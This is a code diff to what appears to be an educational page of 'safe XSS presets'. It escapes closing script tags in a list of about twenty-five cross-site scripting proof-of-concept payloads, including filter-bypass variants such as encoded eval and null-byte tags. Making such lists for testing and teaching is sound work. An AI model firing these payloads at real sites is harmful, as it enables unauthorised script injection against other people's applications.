@@ -348,11 +348,11 @@
 
     // ----- 25 safe XSS presets (educational) -----
     const presets = [
-      "<script>alert('XSS')</script>",
+      "<script>alert('XSS')<\/script>",
       "<img src=x onerror=alert(1)>",
       "<svg onload=alert(1)>",
       "javascript:alert('XSS')",
-      "\"><script>alert(1)</script>",
+      "\"><script>alert(1)<\/script>",
       "'-alert(1)-'",
       "<body onload=alert(1)>",
       "<input onfocus=alert(1) autofocus>",
@@ -363,16 +363,16 @@
       "';alert(1);//",
       "<a href=\"javascript:alert(1)\">click</a>",
       "<div onmouseover=alert(1)>hover</div>",
-      "<!--<script>alert(1)</script>-->",
-      "<![CDATA[<script>alert(1)</script>]]>",
-      "<%00script>alert(1)</script>",
-      "<script>alert(String.fromCharCode(88,83,83))</script>",
-      "<script>eval(atob('YWxlcnQoMSk='))</script>",
-      "1<script>alert(1)</script>",
+      "<!--<script>alert(1)<\/script>-->",
+      "<![CDATA[<script>alert(1)<\/script>]]>",
+      "<%00script>alert(1)<\/script>",
+      "<script>alert(String.fromCharCode(88,83,83))<\/script>",
+      "<script>eval(atob('YWxlcnQoMSk='))<\/script>",
+      "1<script>alert(1)<\/script>",
       "<script src=data:text/javascript,alert(1)>",
       "<marquee onstart=alert(1)>",
       "<isindex type=image src=x onerror=alert(1)>",
-      "<script>window.onerror=eval;throw'=alert\\x281\\x29'</script>"
+      "<script>window.onerror=eval;throw'=alert\\x281\\x29'<\/script>"
     ];
 
     // render preset chips
